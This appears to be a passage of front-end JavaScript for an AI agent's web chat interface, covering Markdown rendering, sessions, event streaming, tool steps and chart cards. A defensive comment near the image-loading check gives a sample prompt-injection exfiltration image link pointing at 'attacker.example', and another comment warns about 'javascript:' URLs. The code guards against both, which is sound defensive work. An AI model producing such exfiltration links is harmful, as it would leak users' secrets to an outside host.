(function () {
  'use strict';

  // ---------------------------------------------------------------------
  // Markdown rendering: marked -> highlight.js (per code block) -> DOMPurify
  // ---------------------------------------------------------------------

  function escapeHtml(s) {
    return s.replace(/[&<>"']/g, (c) => ({
      '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;',
    }[c]));
  }

  const IMAGE_EXTENSIONS = /\.(png|jpe?g|gif|webp|svg|bmp|avif|ico)$/i;
  function isImageFilename(name) {
    return IMAGE_EXTENSIONS.test((name || '').split(/[?#]/)[0]);
  }

  // Every current event producer builds ev.url server-side from a fixed
  // template (a coolton file-server link, a whiteboard/desktop-stream URL),
  // so there's no live path from model output to here today — but
  // Surface.post_embed/post_image/post_file_link are public methods, and an
  // unvalidated string handed straight to iframe.src/a.href/img.src is one
  // future tool call away from a "javascript:" URL executing in this page's
  // origin. Only ever assign a value this has approved.
  function safeUrl(url) {
    if (typeof url !== 'string' || !url) return '';
    try {
      const resolved = new URL(url, window.location.href);
      return (resolved.protocol === 'http:' || resolved.protocol === 'https:') ? url : '';
    } catch (e) {
      return '';
    }
  }

  const mdRenderer = new marked.Renderer();
  mdRenderer.code = function (code, infostring) {
    const lang = (infostring || '').trim().split(/\s+/)[0];
    let html;
    try {
      if (lang && window.hljs && hljs.getLanguage(lang)) {
        html = hljs.highlight(code, { language: lang }).value;
      } else if (window.hljs) {
        html = hljs.highlightAuto(code).value;
      } else {
        html = escapeHtml(code);
      }
    } catch (e) {
      html = escapeHtml(code);
    }
    return `<pre><code class="hljs language-${lang || ''}">${html}</code></pre>`;
  };
  marked.setOptions({ gfm: true, breaks: false, renderer: mdRenderer });

  // ---------------------------------------------------------------------
  // Emoji shortcodes (:tada:, :white_check_mark:, ...) -> real Unicode glyphs.
  // Slack renders these inline; a bare browser doesn't, so the map does it here.
  // ---------------------------------------------------------------------

  let EMOJI_MAP = null;
  const emojiMapReady = fetch('/static/vendor/emoji-map.json')
    .then((r) => r.json())
    .then((m) => { EMOJI_MAP = m; })
    .catch(() => { EMOJI_MAP = {}; });

  // Not every standard Slack emoji (e.g. custom workspace emoji) resolves to
  // Unicode. cachet.dunkirk.sh mirrors Slack's custom emoji by name and
  // redirects /emojis/<name>/r to the actual image.
  const CUSTOM_EMOJI_URL = (name) => `https://cachet.dunkirk.sh/emojis/${encodeURIComponent(name)}/r`;

  function emojiFor(name) {
    if (!EMOJI_MAP) return null;
    const key = name.toLowerCase();
    if (EMOJI_MAP[key]) return EMOJI_MAP[key];
    const swapped = key.includes('-') ? key.replace(/-/g, '_') : key.replace(/_/g, '-');
    return EMOJI_MAP[swapped] || null;
  }

  function convertShortcodes(text) {
    if (!EMOJI_MAP || !text) return text;
    return text.replace(/:([a-z0-9_+\-]+):/gi, (match, name) => emojiFor(name) || match);
  }

  // Same as convertShortcodes, but for text headed into innerHTML: unresolved
  // names become an <img> for a custom emoji instead of staying as ":name:".
  function convertShortcodesHTML(text) {
    if (!EMOJI_MAP || !text) return text;
    return text.replace(/:([a-z0-9_+\-]+):/gi, (match, name) => {
      const glyph = emojiFor(name);
      if (glyph) return glyph;
      return `<img class="emoji-img" src="${CUSTOM_EMOJI_URL(name)}" alt="${match}" title="${match}">`;
    });
  }

  // Model output can carry an image built to leak something (a prompt-injected
  // `![](https://attacker.example/?q=<secret>)`): rendering it makes the browser fetch
  // that URL. Only images from here, custom emoji and inline data load; any other
  // image becomes a plain link to it.
  const LOADABLE_IMAGE_ORIGINS = new Set([window.location.origin, 'https://cachet.dunkirk.sh']);
  function isLoadableImage(src) {
    try {
      const url = new URL(src || '', window.location.href);
      return url.protocol === 'data:' || LOADABLE_IMAGE_ORIGINS.has(url.origin);
    } catch (e) {
      return false;
    }
  }

  function renderMarkdown(text) {
    const raw = marked.parse(convertShortcodesHTML(text || ''));
    // A <template> parses without loading anything, so blocked images never fetch.
    const template = document.createElement('template');
    template.innerHTML = DOMPurify.sanitize(raw, { ADD_ATTR: ['target', 'rel'] });
    template.content.querySelectorAll('img').forEach((img) => {
      if (isLoadableImage(img.getAttribute('src'))) return;
      const link = document.createElement('a');
      link.href = safeUrl(img.getAttribute('src')) || '#';
      link.textContent = img.getAttribute('alt') || 'image';
      img.replaceWith(link);
    });
    return template.innerHTML;
  }

  function linkifyExternal(container) {
    container.querySelectorAll('a[href]').forEach((a) => {
      a.setAttribute('target', '_blank');
      a.setAttribute('rel', 'noopener noreferrer');
    });
  }

  function fmtElapsed(seconds) {
    if (seconds < 1) return `${Math.round(seconds * 1000)}ms`;
    if (seconds < 60) return `${seconds.toFixed(1)}s`;
    return `${Math.floor(seconds / 60)}m${Math.round(seconds % 60)}s`;
  }

  function fmtClock(ts) {
    if (!ts) return '';
    return new Date(ts * 1000).toTimeString().slice(0, 5); // HH:MM
  }

  function fmtSidebarTime(ts) {
    if (!ts) return '';
    const d = new Date(ts * 1000);
    const now = new Date();
    if (d.toDateString() === now.toDateString()) return d.toTimeString().slice(0, 5);
    const year = d.getFullYear() === now.getFullYear() ? undefined : 'numeric';
    return d.toLocaleDateString(undefined, { month: 'short', day: 'numeric', year });
  }

  // coolton's own status vocabulary, from its system prompt — reused here so the
  // UI names each step the same way the agent does.
  const MARKERS = { in_progress: '◐', complete: '●', error: '✕' };
  const UNTITLED = 'Untitled session';

  // ---------------------------------------------------------------------
  // DOM refs
  // ---------------------------------------------------------------------

  const $ = (id) => document.getElementById(id);
  const appEl = $('app');
  const drawerToggle = $('drawerToggle');
  const backdrop = $('backdrop');
  const convoListEl = $('conversationList');
  const userFooterEl = $('userFooter');
  const newConvoBtn = $('newConversationBtn');
  const statusTitleEl = $('statusTitle');
  const statusStateEls = [$('statusStateHeader'), $('statusStateComposer')];
  const transcriptEl = $('transcript');
  const emptyStateEl = $('emptyState');
  const composerEl = $('composer');
  const composerInput = $('composerInput');
  const sendBtn = $('sendBtn');
  const stopBtn = $('stopBtn');
  const attachBtn = $('attachBtn');
  const fileInput = $('fileInput');
  const attachmentTray = $('attachmentTray');
  const tplUserMessage = $('tpl-user-message');
  const tplTurn = $('tpl-turn');
  const tplSpineNode = $('tpl-spine-node');

  // ---------------------------------------------------------------------
  // State
  // ---------------------------------------------------------------------

  let me = null;
  let currentConversationId = null;
  let eventSource = null;
  let activeTurnEl = null;
  let spineNodeByStepId = new Map();
  let stepStartTs = new Map();
  let messageElBySeq = new Map();
  let pendingAttachments = []; // [{id, url, name, mime, size}]
  let isWorking = false;
  let isStopping = false;

  // ---------------------------------------------------------------------
  // API helpers
  // ---------------------------------------------------------------------

  async function api(path, opts) {
    const resp = await fetch(path, { credentials: 'same-origin', ...opts });
    if (resp.status === 401) {
      window.location.href = '/oauth/login';
      throw new Error('unauthenticated');
    }
    return resp;
  }

  async function apiJson(path, opts) {
    const resp = await api(path, opts);
    if (!resp.ok) throw new Error(`${path} -> ${resp.status}`);
    return resp.json();
  }

  function icon(id, className) {
    const svg = document.createElementNS('http://www.w3.org/2000/svg', 'svg');
    svg.setAttribute('class', className || 'icon');
    svg.setAttribute('viewBox', '0 0 24 24');
    const use = document.createElementNS('http://www.w3.org/2000/svg', 'use');
    use.setAttribute('href', `#${id}`);
    svg.appendChild(use);
    return svg;
  }

  // ---------------------------------------------------------------------
  // Sidebar / conversations
  // ---------------------------------------------------------------------

  async function loadMe() {
    me = await apiJson('/api/me');
    userFooterEl.innerHTML = '';
    const img = document.createElement('img');
    img.src = me.avatar_url;
    img.alt = '';
    const name = document.createElement('span');
    name.textContent = me.display_name;
    const logout = document.createElement('a');
    logout.href = '/oauth/logout';
    logout.textContent = 'Sign out';
    userFooterEl.append(img, name, logout);
  }

  async function loadConversations(selectId, selectOpts) {
    const rows = await apiJson('/api/conversations');
    convoListEl.innerHTML = '';

    if (!rows.length) {
      const empty = document.createElement('p');
      empty.className = 'session-empty';
      empty.textContent = 'No sessions yet.';
      convoListEl.appendChild(empty);
    }

    for (const row of rows) {
      convoListEl.appendChild(buildSessionItem(row));
    }

    if (selectId && rows.some((r) => r.id === selectId)) {
      await selectConversation(selectId, selectOpts);
    } else if (selectId) {
      // The URL (bookmark, reload, back/forward) pointed at a session that no
      // longer exists or isn't ours — draft, not a silent 404. Scrub the
      // stale id out of the address bar rather than leaving it pointed at
      // something that isn't actually what's on screen.
      showDraftState({ skipHistory: true });
      history.replaceState(null, '', location.pathname);
    } else if (currentConversationId && rows.some((r) => r.id === currentConversationId)) {
      markSidebarActive(currentConversationId);
    } else if (!currentConversationId) {
      // No id in the URL and nothing already open: this is "/" itself, which
      // is the same starting point as clicking New session, not a jump into
      // whatever session happens to be most recent.
      showDraftState({ skipHistory: true });
    }
  }

  function buildSessionItem(row) {
    const item = document.createElement('div');
    item.className = 'session-item';
    item.dataset.id = row.id;
    const title = (row.title || '').trim();
    if (!title) item.classList.add('untitled');
    if (row.id === currentConversationId) item.classList.add('active');
    if (row.working) item.classList.add('working');

    const open = document.createElement('button');
    open.type = 'button';
    open.className = 'session-open';

    const titleEl = document.createElement('span');
    titleEl.className = 'session-item-title';
    titleEl.textContent = title || UNTITLED;

    const timeEl = document.createElement('span');
    timeEl.className = 'session-item-time';
    timeEl.textContent = fmtSidebarTime(row.updated_at);

    open.append(titleEl, timeEl);
    open.addEventListener('click', () => { selectConversation(row.id); closeDrawer(); });

    const live = document.createElement('span');
    live.className = 'session-item-live';
    live.title = 'coolton is working in this session';

    const del = document.createElement('button');
    del.type = 'button';
    del.className = 'session-delete';
    del.title = 'Delete this session';
    del.setAttribute('aria-label', `Delete ${title || UNTITLED}`);
    del.appendChild(icon('i-trash'));

    // Deleting a transcript is not undoable, so it asks — in the row itself,
    // where the thing being deleted is, rather than in a browser dialog.
    const confirmBar = document.createElement('div');
    confirmBar.className = 'session-confirm';
    confirmBar.hidden = true;
    const confirmText = document.createElement('span');
    confirmText.textContent = 'Delete?';
    const yes = document.createElement('button');
    yes.type = 'button';
    yes.className = 'confirm-yes';
    yes.textContent = 'Delete';
    const no = document.createElement('button');
    no.type = 'button';
    no.className = 'confirm-no';
    no.textContent = 'Keep';
    confirmBar.append(confirmText, yes, no);

    const closeConfirm = () => {
      confirmBar.hidden = true;
      item.classList.remove('confirming');
      document.removeEventListener('keydown', onKey, true);
    };
    function onKey(e) { if (e.key === 'Escape') closeConfirm(); }

    del.addEventListener('click', () => {
      convoListEl.querySelectorAll('.session-item.confirming').forEach((el) => {
        el.classList.remove('confirming');
        el.querySelector('.session-confirm').hidden = true;
      });
      confirmBar.hidden = false;
      item.classList.add('confirming');
      document.addEventListener('keydown', onKey, true);
      no.focus();
    });
    no.addEventListener('click', closeConfirm);
    yes.addEventListener('click', () => { closeConfirm(); deleteConversation(row.id); });

    item.append(open, live, del, confirmBar);
    return item;
  }

  function markSidebarActive(id) {
    convoListEl.querySelectorAll('.session-item').forEach((b) => {
      b.classList.toggle('active', b.dataset.id === id);
    });
  }

  function markSidebarWorking(id, working) {
    const btn = convoListEl.querySelector(`.session-item[data-id="${CSS.escape(id)}"]`);
    if (btn) btn.classList.toggle('working', working);
  }

  function setSidebarTitle(id, title) {
    const btn = convoListEl.querySelector(`.session-item[data-id="${CSS.escape(id)}"]`);
    if (!btn) return;
    btn.classList.toggle('untitled', !title);
    btn.querySelector('.session-item-title').textContent = title || UNTITLED;
  }

  async function createConversation() {
    const meta = await apiJson('/api/conversations', { method: 'POST' });
    await loadConversations(meta.id);
    closeDrawer();
    composerInput.focus();
    return meta.id;
  }

  async function deleteConversation(id) {
    try {
      await api(`/api/conversations/${id}`, { method: 'DELETE' });
    } catch (err) {
      console.error('Failed to delete session', err);
      return;
    }
    if (id === currentConversationId) showDraftState();
    await loadConversations();
  }

  function showEmptyState() {
    transcriptEl.innerHTML = '';
    transcriptEl.appendChild(emptyStateEl);
    emptyStateEl.hidden = false;
  }

  // The state "/" and New session both land on: nothing is created (and
  // nothing hits the network) until the first message actually sends — see
  // the composer submit handler, the only place that calls createConversation.
  function showDraftState(opts) {
    if (eventSource) { eventSource.close(); eventSource = null; }
    currentConversationId = null;
    activeTurnEl = null;
    spineNodeByStepId = new Map();
    stepStartTs = new Map();
    messageElBySeq = new Map();
    isWorking = false;
    isStopping = false;
    updateComposerState();
    updateStatusBar();
    markSidebarActive(null);
    statusTitleEl.textContent = 'New session';
    showEmptyState();
    if (!opts || !opts.skipHistory) history.pushState(null, '', location.pathname);
  }

  // A real link, not a script-driven redirect — clicking it is the deliberate
  // action that was missing (see /oauth/logout's comment for why landing on
  // "/" after sign-out silently re-authorized before the user saw anything).
  function renderAuthScreen(message) {
    appEl.hidden = true;
    const screen = document.createElement('div');
    screen.className = 'auth-screen';
    screen.innerHTML = `
      <img src="/static/coolton.png" alt="">
      <p>${message}</p>
      <a href="/oauth/login" class="auth-signin">Sign in</a>
    `;
    document.body.appendChild(screen);
  }

  async function selectConversation(id, opts) {
    if (eventSource) { eventSource.close(); eventSource = null; }
    currentConversationId = id;
    activeTurnEl = null;
    spineNodeByStepId = new Map();
    stepStartTs = new Map();
    messageElBySeq = new Map();
    isWorking = false;
    isStopping = false;
    updateComposerState();
    updateStatusBar();
    markSidebarActive(id);
    // Bookmarkable, reloadable, and back/forward-able — reloading this exact
    // URL later re-opens this same session (see loadConversations reading it
    // back on init, and the popstate handler for back/forward).
    if (!opts || !opts.skipHistory) {
      history.pushState(null, '', `${location.pathname}?c=${encodeURIComponent(id)}`);
    }

    transcriptEl.innerHTML = '';
    const data = await apiJson(`/api/conversations/${id}`);
    statusTitleEl.textContent = (data.meta && data.meta.title) || UNTITLED;

    let lastSeq = 0;
    for (const ev of data.events) {
      handleEvent(ev, { replay: true });
      lastSeq = Math.max(lastSeq, ev.seq || 0);
    }
    // A turn left open by replay means it's genuinely still running right now.
    if (activeTurnEl) {
      isWorking = true;
      updateComposerState();
      updateStatusBar('working');
    }
    if (!data.events.length) {
      // Same copy as the pre-sign-in empty state (#emptyState in index.html) —
      // an empty conversation isn't a different situation from never having
      // started one, so it shouldn't say something different.
      const empty = emptyStateEl.cloneNode(true);
      empty.removeAttribute('id');
      empty.hidden = false;
      transcriptEl.appendChild(empty);
    }
    scrollToBottom();
    connectStream(id, lastSeq);
  }

  function connectStream(id, after) {
    // The server never sends an SSE "id:" field, so a native EventSource
    // reconnect (a network blip, the tab being backgrounded, a server
    // restart) just reopens this exact URL — including the "after" it was
    // built with at the very first connect, frozen forever. Every reconnect
    // then replays the whole turn from that stale watermark, and nothing
    // dedupes it, which is why a turn could render itself several times
    // over. Closing the EventSource ourselves in onerror (instead of letting
    // it auto-reconnect) and reopening with an advancing "after" fixes the
    // replay; the seenSeqs check is a second guard against the server's own
    // replay-vs-live-queue overlap (see stream_events' own comment) landing
    // on this same connection.
    let lastSeq = after;
    const seenSeqs = new Set();

    function open() {
      eventSource = new EventSource(`/api/conversations/${id}/events?after=${lastSeq}`);
      eventSource.onmessage = (msg) => {
        if (!msg.data) return;
        let ev;
        try { ev = JSON.parse(msg.data); } catch (e) { return; }
        if (id !== currentConversationId) return;
        if (ev.seq != null) {
          if (seenSeqs.has(ev.seq)) return;
          seenSeqs.add(ev.seq);
          lastSeq = Math.max(lastSeq, ev.seq);
        }
        if (transcriptEl.querySelector('.empty-state')) transcriptEl.innerHTML = '';
        handleEvent(ev);
        scrollToBottomIfNearBottom();
      };
      eventSource.onerror = () => {
        if (id !== currentConversationId) return;
        eventSource.close();
        setTimeout(() => { if (id === currentConversationId) open(); }, 2000);
      };
    }
    open();
  }

  function scrollToBottom() {
    transcriptEl.scrollTop = transcriptEl.scrollHeight;
  }

  function scrollToBottomIfNearBottom() {
    const nearBottom = transcriptEl.scrollHeight - transcriptEl.scrollTop - transcriptEl.clientHeight < 140;
    if (nearBottom) scrollToBottom();
  }

  // ---------------------------------------------------------------------
  // Event -> DOM
  // ---------------------------------------------------------------------

  function handleEvent(ev, opts) {
    switch (ev.type) {
      case 'user_message': return renderUserMessage(ev);
      case 'turn_start': return startTurn(ev, opts);
      case 'turn_status': return setTurnStatus(ev, opts);
      case 'step': return handleStep(ev);
      case 'agent_message': return handleAgentMessage(ev);
      case 'turn_end': return endTurn(ev, opts);
      case 'reaction': return handleReaction(ev);
      default: return;
    }
  }

  function renderUserMessage(ev) {
    const node = tplUserMessage.content.firstElementChild.cloneNode(true);
    node.dataset.seq = ev.seq;
    node.querySelector('.row-time').textContent = fmtClock(ev.ts);

    const img = node.querySelector('.actor-avatar');
    const mine = me && ev.user_id === me.slack_id;
    img.src = mine ? me.avatar_url : `https://cachet.dunkirk.sh/users/${encodeURIComponent(ev.user_id || '')}/r`;
    node.querySelector('.actor-name').textContent = mine ? (me.display_name || 'You') : (ev.user_id || 'Someone');
    node.querySelector('.row-text').textContent = ev.text || '';

    const attachEl = node.querySelector('.row-attachments');
    for (const a of ev.attachments || []) attachEl.appendChild(renderAttachmentChip(a));

    transcriptEl.appendChild(node);
    messageElBySeq.set(ev.seq, node);
    // A message sent while a turn is still running is steering, not a new
    // turn — the run in flight folds it in and keeps going, ending with the
    // same turn_end. Only clear activeTurnEl for a genuine new turn, or
    // ensureTurn() spins up a second `.turn.working` row for the rest of the
    // steered turn's events, and the eventual turn_end (which only ever
    // touches activeTurnEl) leaves the first row animating "working" forever.
    if (!activeTurnEl || !activeTurnEl.classList.contains('working')) {
      activeTurnEl = null;
    }
  }

  function renderAttachmentChip(a) {
    const chip = document.createElement('div');
    chip.className = 'attachment-chip';
    if ((a.mime || a.media_type || '').startsWith('image/')) {
      const img = document.createElement('img');
      img.src = a.url || `/api/files/${a.id}`;
      img.alt = a.name || '';
      chip.appendChild(img);
    } else {
      chip.textContent = a.name || a.id;
    }
    return chip;
  }

  function startTurn(ev, opts) {
    const node = tplTurn.content.firstElementChild.cloneNode(true);
    node.dataset.seq = ev.seq;
    node.querySelector('.row-time').textContent = fmtClock(ev.ts);
    node.querySelector('.spine-head').addEventListener('click', () => {
      node.classList.toggle('steps-collapsed');
    });
    transcriptEl.appendChild(node);
    activeTurnEl = node;
    spineNodeByStepId = new Map();
    stepStartTs = new Map();
    if (opts && opts.replay) return;
    isWorking = true;
    isStopping = false;
    updateComposerState();
    updateStatusBar('working');
    markSidebarWorking(currentConversationId, true);
    refreshSidebarMeta();
  }

  function ensureTurn() {
    if (!activeTurnEl) startTurn({ seq: 0, ts: Date.now() / 1000 }, { replay: true });
    return activeTurnEl;
  }

  function setTurnStatus(ev, opts) {
    ensureTurn();
    if (opts && opts.replay) return;
    updateStatusBar('working', ev.text);
  }

  function updateStatusBar(state, text) {
    if (state) isWorking = state === 'working';
    const label = !isWorking ? 'Idle' : isStopping ? 'Stopping…' : convertShortcodes(text || 'Working');
    for (const el of statusStateEls) {
      el.classList.toggle('working', isWorking && !isStopping);
      el.classList.toggle('stopping', isWorking && isStopping);
      el.querySelector('.status-state-text').textContent = label;
    }
  }

  function showSpineGroup(turn) {
    turn.querySelector('.spine-group').hidden = false;
    return turn.querySelector('.spine');
  }

  function updateStepCount(turn) {
    const n = turn.querySelectorAll('.spine-node').length;
    turn.querySelector('.spine-count').textContent = `${n} step${n === 1 ? '' : 's'}`;
  }

  function newSpineNode(status, kind) {
    const node = tplSpineNode.content.firstElementChild.cloneNode(true);
    node.dataset.status = status;
    if (kind) node.dataset.kind = kind;
    node.querySelector('.spine-marker').textContent = MARKERS[status] || MARKERS.in_progress;
    return node;
  }

  function handleStep(ev) {
    const turn = ensureTurn();
    const spine = showSpineGroup(turn);

    if (ev.kind === 'model') {
      const node = newSpineNode('complete', 'model');
      node.querySelector('.spine-title').textContent = `Model: ${ev.text}`;
      node.querySelector('.spine-line').disabled = true;
      spine.appendChild(node);
      updateStepCount(turn);
      return;
    }

    if (ev.kind === 'reasoning') {
      const node = newSpineNode('complete', 'reasoning');
      node.querySelector('.spine-title').textContent = 'Thought it through';
      wireSpineToggle(node);
      node.querySelector('.spine-result').textContent = ev.text || '';
      spine.appendChild(node);
      updateStepCount(turn);
      return;
    }

    if (ev.kind === 'tool') {
      let node = spineNodeByStepId.get(ev.step_id);
      if (!node) {
        node = newSpineNode(ev.status, 'tool');
        wireSpineToggle(node);
        spine.appendChild(node);
        spineNodeByStepId.set(ev.step_id, node);
        stepStartTs.set(ev.step_id, ev.ts);
        updateStepCount(turn);
      }
      node.dataset.status = ev.status;
      node.querySelector('.spine-marker').textContent = MARKERS[ev.status] || MARKERS.in_progress;
      node.querySelector('.spine-title').textContent = ev.display || ev.tool_name;

      if (ev.status === 'in_progress' && ev.args) {
        node.querySelector('.spine-args').innerHTML = renderKvTable(ev.args);
      }
      if ((ev.status === 'complete' || ev.status === 'error') && ev.result !== undefined) {
        const resultEl = node.querySelector('.spine-result');
        resultEl.textContent = typeof ev.result === 'string' ? ev.result : JSON.stringify(ev.result, null, 2);
        const started = stepStartTs.get(ev.step_id);
        if (started) node.querySelector('.spine-time').textContent = fmtElapsed(ev.ts - started);
      }
    }
  }

  function wireSpineToggle(node) {
    const head = node.querySelector('.spine-line');
    const body = node.querySelector('.spine-detail');
    head.addEventListener('click', () => {
      body.hidden = !body.hidden;
      node.classList.toggle('open', !body.hidden);
    });
  }

  function renderKvTable(obj) {
    if (obj === null || typeof obj !== 'object') {
      return `<div class="kv-table">${escapeHtml(String(obj))}</div>`;
    }
    const rows = Object.entries(obj).map(([k, v]) => {
      const val = typeof v === 'string' ? v : JSON.stringify(v, null, 2);
      return `<tr><td>${escapeHtml(k)}</td><td>${escapeHtml(val)}</td></tr>`;
    }).join('');
    return `<table class="kv-table">${rows}</table>`;
  }

  // ---------------------------------------------------------------------
  // Cards: the Slack Block Kit coolton posts with send_card_tool, drawn here
  // (agent/tools/json_render_card.py). Every string from the blocks goes in
  // through textContent or the sanitizing Markdown renderer, never raw HTML.
  // ---------------------------------------------------------------------

  let cardPromptSender = null;
  // Categorical order for chart series, stepped for this dark surface
  // (passes the dataviz palette checks on --panel).
  const SERIES_COLORS = ['#3987e5', '#d95926', '#199e70', '#c98500', '#d55181', '#008300', '#9085e9', '#e66767'];
  const SVG_NS = 'http://www.w3.org/2000/svg';

  function el(tag, className, text) {
    const node = document.createElement(tag);
    if (className) node.className = className;
    if (text !== undefined) node.textContent = text;
    return node;
  }

  function svgEl(tag, attrs) {
    const node = document.createElementNS(SVG_NS, tag);
    for (const [k, v] of Object.entries(attrs || {})) node.setAttribute(k, v);
    return node;
  }

  // Slack mrkdwn -> Markdown, then the usual sanitized render.
  function mrkdwnToHtml(text) {
    const md = String(text || '')
      .replace(/<(https?:\/\/[^|>]+)\|([^>]+)>/g, '[$2]($1)')
      .replace(/<(https?:\/\/[^>]+)>/g, '$1')
      .replace(/<@([A-Z0-9]+)>/g, '@$1')
      .replace(/<#([A-Z0-9]+)(\|[^>]*)?>/g, '#$1')
      .replace(/(^|[\s(])\*([^*\n]+)\*(?=[\s).,!?:;]|$)/g, '$1**$2**')
      .replace(/(^|[\s(])~([^~\n]+)~(?=[\s).,!?:;]|$)/g, '$1~~$2~~')
      // Slack keeps single line breaks (a field's label, then its value).
      .replace(/\n/g, '  \n');
    return renderMarkdown(md);
  }

  function textOf(obj) {
    return (obj && obj.text) || '';
  }

  function renderTable(block) {
    const wrap = el('div', 'bk-table-wrap');
    const table = el('table', 'bk-table');
    if (block.caption) table.appendChild(el('caption', '', block.caption));
    const rows = block.rows || [];
    const cell = (c) => (c && (c.text !== undefined ? String(c.text) : c.value !== undefined ? String(c.value) : '')) || '';
    const numeric = (rows[0] || []).map((_, i) => rows.slice(1).length > 0 &&
      rows.slice(1).every((r) => /^[-+$€£]?[\d.,]+[%kKmMbB]?$/.test(cell(r[i]).trim())));
    const thead = el('thead');
    const head = el('tr');
    (rows[0] || []).forEach((c, i) => {
      const th = el('th', numeric[i] ? 'num' : '', cell(c));
      if (block.type === 'data_table') {
        th.tabIndex = 0;
        th.title = 'Sort';
        const sort = () => {
          const dir = th.dataset.dir === 'asc' ? 'desc' : 'asc';
          head.querySelectorAll('th').forEach((h) => delete h.dataset.dir);
          th.dataset.dir = dir;
          const value = (r) => {
            const t = r.children[i].textContent;
            const n = parseFloat(t.replace(/[^\d.-]/g, ''));
            return numeric[i] && !isNaN(n) ? n : t.toLowerCase();
          };
          const sorted = [...tbody.children].sort((a, b) => (value(a) > value(b) ? 1 : value(a) < value(b) ? -1 : 0));
          if (dir === 'desc') sorted.reverse();
          sorted.forEach((r) => tbody.appendChild(r));
        };
        th.addEventListener('click', sort);
        th.addEventListener('keydown', (e) => { if (e.key === 'Enter' || e.key === ' ') { e.preventDefault(); sort(); } });
      }
      head.appendChild(th);
    });
    thead.appendChild(head);
    const tbody = el('tbody');
    rows.slice(1).forEach((r) => {
      const tr = el('tr');
      r.forEach((c, i) => tr.appendChild(el('td', numeric[i] ? 'num' : '', cell(c))));
      tbody.appendChild(tr);
    });
    table.append(thead, tbody);
    wrap.appendChild(table);
    return wrap;
  }

  function fmtNum(n) {
    if (Math.abs(n) >= 1e9) return `${+(n / 1e9).toFixed(1)}B`;
    if (Math.abs(n) >= 1e6) return `${+(n / 1e6).toFixed(1)}M`;
    if (Math.abs(n) >= 1e4) return `${+(n / 1e3).toFixed(1)}k`;
    return String(+n.toFixed(2));
  }

  function niceMax(max) {
    if (max <= 0) return 1;
    const step = Math.pow(10, Math.floor(Math.log10(max)));
    for (const m of [1, 2, 2.5, 5, 10]) if (m * step >= max) return m * step;
    return 10 * step;
  }

  function chartTooltip(card) {
    let tip = card.querySelector('.bk-tip');
    if (!tip) { tip = el('div', 'bk-tip'); tip.hidden = true; card.appendChild(tip); }
    return tip;
  }

  function showTip(card, x, y, title, rows) {
    const tip = chartTooltip(card);
    tip.replaceChildren(el('div', 'bk-tip-title', title));
    rows.forEach(([name, value, color]) => {
      const row = el('div', 'bk-tip-row');
      const key = el('span', 'bk-tip-key');
      key.style.background = color;
      row.append(key, el('strong', '', value), el('span', 'bk-tip-name', name));
      tip.appendChild(row);
    });
    tip.hidden = false;
    const box = card.getBoundingClientRect();
    tip.style.left = `${Math.min(Math.max(x - box.left + 12, 4), box.width - tip.offsetWidth - 4)}px`;
    tip.style.top = `${Math.max(y - box.top - tip.offsetHeight - 10, 4)}px`;
  }

  function hideTip(card) {
    const tip = card.querySelector('.bk-tip');
    if (tip) tip.hidden = true;
  }

  function legend(items, shape) {
    const row = el('div', 'bk-legend');
    items.forEach(([name, color]) => {
      const item = el('span', 'bk-legend-item');
      const key = el('span', `bk-legend-key ${shape}`);
      key.style.background = color;
      item.append(key, document.createTextNode(name));
      row.appendChild(item);
    });
    return row;
  }

  function renderPie(card, chart) {
    const segments = chart.segments || [];
    const total = segments.reduce((sum, s) => sum + s.value, 0) || 1;
    const svg = svgEl('svg', { viewBox: '0 0 200 200', class: 'bk-pie', role: 'img' });
    let angle = -Math.PI / 2;
    segments.forEach((s, i) => {
      const color = SERIES_COLORS[i % SERIES_COLORS.length];
      const sweep = (s.value / total) * Math.PI * 2;
      const [x1, y1] = [100 + 90 * Math.cos(angle), 100 + 90 * Math.sin(angle)];
      const [x2, y2] = [100 + 90 * Math.cos(angle + sweep), 100 + 90 * Math.sin(angle + sweep)];
      const path = segments.length === 1
        ? svgEl('circle', { cx: 100, cy: 100, r: 90 })
        : svgEl('path', { d: `M100 100 L${x1} ${y1} A90 90 0 ${sweep > Math.PI ? 1 : 0} 1 ${x2} ${y2} Z` });
      path.setAttribute('fill', color);
      path.setAttribute('class', 'bk-mark');
      path.setAttribute('tabindex', '0');
      const pct = `${Math.round((s.value / total) * 100)}%`;
      const show = (e) => {
        const r = path.getBoundingClientRect();
        showTip(card, e.clientX || r.left + r.width / 2, e.clientY || r.top, s.label, [['', `${fmtNum(s.value)} · ${pct}`, color]]);
      };
      path.addEventListener('pointermove', show);
      path.addEventListener('focus', show);
      path.addEventListener('pointerleave', () => hideTip(card));
      path.addEventListener('blur', () => hideTip(card));
      svg.appendChild(path);
      angle += sweep;
    });
    const wrap = el('div', 'bk-pie-wrap');
    wrap.appendChild(svg);
    wrap.appendChild(legend(segments.map((s, i) => [s.label, SERIES_COLORS[i % SERIES_COLORS.length]]), 'box'));
    return wrap;
  }

  function renderSeriesChart(card, chart) {
    const cats = (chart.axis_config && chart.axis_config.categories) || [];
    const series = chart.series || [];
    const values = series.map((s) => cats.map((c) => {
      const p = (s.data || []).find((d) => d.label === c);
      return p ? Number(p.value) : 0;
    }));
    const W = 640, H = 260, L = 48, R = 12, T = 12, B = 34;
    const max = niceMax(Math.max(0, ...values.flat()));
    const min = Math.min(0, ...values.flat());
    const y = (v) => T + (H - T - B) * (1 - (v - min) / ((max - min) || 1));
    const band = (W - L - R) / Math.max(cats.length, 1);
    const xMid = (i) => L + band * (i + 0.5);
    const svg = svgEl('svg', { viewBox: `0 0 ${W} ${H}`, class: 'bk-chart', role: 'img' });

    for (let k = 0; k <= 4; k++) {
      const v = min + ((max - min) * k) / 4;
      svg.appendChild(svgEl('line', { x1: L, x2: W - R, y1: y(v), y2: y(v), class: 'bk-grid' }));
      const label = svgEl('text', { x: L - 6, y: y(v) + 4, class: 'bk-axis', 'text-anchor': 'end' });
      label.textContent = fmtNum(v);
      svg.appendChild(label);
    }
    const every = Math.ceil(cats.length / 10);
    cats.forEach((c, i) => {
      if (i % every) return;
      const label = svgEl('text', { x: xMid(i), y: H - B + 18, class: 'bk-axis', 'text-anchor': 'middle' });
      label.textContent = c;
      svg.appendChild(label);
    });

    const color = (j) => SERIES_COLORS[j % SERIES_COLORS.length];
    if (chart.type === 'bar') {
      const inner = band * 0.72;
      const w = Math.max((inner - 2 * (series.length - 1)) / series.length, 2);
      values.forEach((vals, j) => vals.forEach((v, i) => {
        const x = xMid(i) - inner / 2 + j * (w + 2);
        const top = y(Math.max(v, 0));
        const h = Math.max(Math.abs(y(v) - y(0)), 1);
